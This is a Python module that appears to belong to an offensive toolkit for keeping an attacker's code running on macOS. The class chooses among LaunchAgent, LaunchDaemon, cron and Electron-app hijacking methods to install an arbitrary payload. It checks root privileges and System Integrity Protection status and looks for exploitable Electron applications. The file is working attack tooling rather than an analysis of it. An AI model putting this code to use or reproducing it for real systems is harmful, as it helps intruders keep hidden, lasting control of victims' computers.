"""
macos.py: macOS-specific persistence logic.
"""

import platform

from pathlib import Path

from .base                                import Persistence

from .macos_utilities.electron            import SearchElectron
from .macos_utilities.launchd             import LaunchService
from .macos_utilities.persistence_methods import MacPersistenceMethods

from .unix_utilities.permissions          import UnixPrivilege
from .unix_utilities.cronjob              import Cronjob

if platform.system() == "Darwin":
    import py_sip_xnu
else:
    py_sip_xnu = None


class MacPersistence(Persistence):
    """
    macOS-specific persistence logic.

    identifier: Effective user ID of the user to install the payload as.
    """

    def __init__(self, payload: str, identifier: int, custom_method: str = None) -> None:
        super().__init__(payload, identifier, custom_method)

        # Inherited from Persistence class:
        self.payload
        self.identifier
        self.custom_method
        self.temp_dir
        self.recommended_method

        self.xnu_version = self._get_xnu_version()
        self.vulnerable_electron_app = SearchElectron().find_first_exploitable_application()

        super().__post_init__()


    def _get_xnu_version(self) -> int:
        """
        Get major XNU version.
        """
        return int(platform.release().split(".")[0])


    def __is_method_available(self, method: str) -> bool:
        """
        Check if the persistence method is available on the system.
        """
        # Check if cron available.
        if method in [
            MacPersistenceMethods.CRONJOB_USER.value,
            MacPersistenceMethods.CRONJOB_ROOT.value
        ]:
            if Path("/System/Library/LaunchDaemons/com.vix.cron.plist").exists():
                return True
            return False

        raise NotImplementedError(f"Method {method} not implemented.")


    def _determine_recommended_persistence_method(self) -> str:
        """
        Determine the recommended persistence method for macOS.
        """
        supported_methods = self.supported_persistence_methods()
        if self.vulnerable_electron_app:
            if MacPersistenceMethods.LAUNCH_AGENT_ELECTRON.value in supported_methods:
                return MacPersistenceMethods.LAUNCH_AGENT_ELECTRON.value

        # If we lack root access, we can only use user-level persistence methods.
        if self.identifier != UnixPrivilege.ROOT.value:
            if MacPersistenceMethods.LAUNCH_AGENT_USER.value in supported_methods:
                return MacPersistenceMethods.LAUNCH_AGENT_USER.value

        if py_sip_xnu and py_sip_xnu.SipXnu().sip_object.can_edit_root is True:
            if MacPersistenceMethods.LAUNCH_DAEMON_SYSTEM.value in supported_methods:
                return MacPersistenceMethods.LAUNCH_DAEMON_SYSTEM.value

        if MacPersistenceMethods.LAUNCH_DAEMON_LIBRARY.value in supported_methods:
            return MacPersistenceMethods.LAUNCH_DAEMON_LIBRARY.value

        return "No recommended method available."


    def supported_persistence_methods(self) -> list:
        """
        Get a list of supported persistence methods for macOS.
        """
        methods = [method.value for method in MacPersistenceMethods]
        if self.identifier != UnixPrivilege.ROOT.value:
            methods.remove(MacPersistenceMethods.LAUNCH_DAEMON_LIBRARY.value)
            methods.remove(MacPersistenceMethods.LAUNCH_AGENT_LIBRARY.value)
            methods.remove(MacPersistenceMethods.CRONJOB_ROOT.value)

        if self.identifier != UnixPrivilege.ROOT.value or not py_sip_xnu or py_sip_xnu.SipXnu().sip_object.can_edit_root is False:
            methods.remove(MacPersistenceMethods.LAUNCH_DAEMON_SYSTEM.value)
            methods.remove(MacPersistenceMethods.LAUNCH_AGENT_SYSTEM.value)

        if not self.vulnerable_electron_app:
            methods.remove(MacPersistenceMethods.LAUNCH_AGENT_ELECTRON.value)

        if MacPersistenceMethods.CRONJOB_USER.value in methods:
            if self.__is_method_available(MacPersistenceMethods.CRONJOB_USER.value) is False:
                methods.remove(MacPersistenceMethods.CRONJOB_USER.value)
        if MacPersistenceMethods.CRONJOB_ROOT.value in methods:
            if self.__is_method_available(MacPersistenceMethods.CRONJOB_ROOT.value) is False:
                methods.remove(MacPersistenceMethods.CRONJOB_ROOT.value)

        return methods


    def install(self) -> None:
        """
        Install payload.
        """
        method = self.configured_persistence_method()

        if method in [
            MacPersistenceMethods.LAUNCH_AGENT_USER.value,
            MacPersistenceMethods.LAUNCH_AGENT_LIBRARY.value,
            MacPersistenceMethods.LAUNCH_DAEMON_LIBRARY.value
        ]:
            LaunchService(self.payload).install_generic_launch_service(method)
            return

        if method in [
            MacPersistenceMethods.LAUNCH_DAEMON_SYSTEM.value,
            MacPersistenceMethods.LAUNCH_AGENT_SYSTEM.value
        ]:
            LaunchService(self.payload).install_root_launch_service(method)
            return

        if method == MacPersistenceMethods.CRONJOB_USER.value:
            Cronjob(self.payload).install_current_user()
            return
        if method == MacPersistenceMethods.CRONJOB_ROOT.value:
            Cronjob(self.payload).install_root()
            return

        if method in [
            MacPersistenceMethods.LAUNCH_AGENT_ELECTRON.value,
            MacPersistenceMethods.LAUNCH_DAEMON_ELECTRON.value
        ]:
            for application in (self.vulnerable_electron_app / "Contents" / "MacOS").glob("*"):
                if application.is_dir():
                    continue
                LaunchService(self.payload).install_electron_launch_service(variant=method, electron_binary=application)
                return

        raise NotImplementedError(f"Method {method} not implemented.")